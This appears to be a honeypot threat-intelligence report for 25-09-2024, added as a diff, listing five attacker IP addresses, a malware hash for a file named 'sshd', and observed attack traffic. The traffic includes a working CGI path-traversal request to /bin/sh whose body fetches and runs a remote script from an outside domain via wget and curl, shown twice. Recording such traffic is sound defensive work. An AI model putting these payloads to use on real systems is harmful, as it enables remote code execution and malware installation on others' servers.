@@ -1,0 +1,27 @@
+Top 5 IPs for 25-09-2024 :
+
+62.122.184.252
+208.180.206.203
+47.114.95.91
+106.75.134.63
+149.50.106.170
+
+
+Malware Observed:
+
+File name : sshd
+6909e1284e37c8f4b75e9bd7cdaca935adf5469c75c37c4a21fc68713bbe0ffc
+https://www.virustotal.com/gui/file/6909e1284e37c8f4b75e9bd7cdaca935adf5469c75c37c4a21fc68713bbe0ffc
+
+
+Commands/exploits observed :
+
+POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1
+Host: <Host IP>
+Content-Type: text/plain
+Connection: close
+
+wget http://pen.gorillafirewall.su/lol.sh; curl http://pen.gorillafirewall.su/lol.sh -O; chmod 777 lol.sh; ./lol.sh; sh lol.sh; rm lol.sh
+
+echo Content-Type: text/plain; echo; wget http://pen.gorillafirewall.su/lol.sh; curl http://pen.gorillafirewall.su/lol.sh -O; chmod 777 lol.sh; ./lol.sh; sh lol.sh; rm lol.sh
+
